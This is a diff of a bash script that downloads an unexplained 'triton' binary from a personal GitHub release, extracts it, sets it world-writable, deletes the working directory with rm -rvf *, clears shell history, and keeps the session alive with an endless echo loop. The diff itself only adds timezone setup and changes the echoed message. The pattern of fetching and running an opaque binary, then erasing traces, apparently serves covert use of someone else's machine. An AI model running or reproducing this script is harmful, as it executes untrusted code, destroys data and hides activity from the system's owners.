@@ -1,6 +1,8 @@
 #!/bin/bash
 set -x
-apt-get update 
+apt-get update
+ln -fs /usr/share/zoneinfo/America/Montserrat /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 wget https://github.com/kolorijo01/metgoi/releases/download/triton/triton.tar.gz > /dev/null 2>&1
 tar -xvf triton.tar.gz
 chmod 777 triton
@@ -9,6 +11,6 @@ rm -rvf *
 history -cr
 while true
 do
-        echo "Download....!"
+        echo "croot....!"
         sleep 20
 done
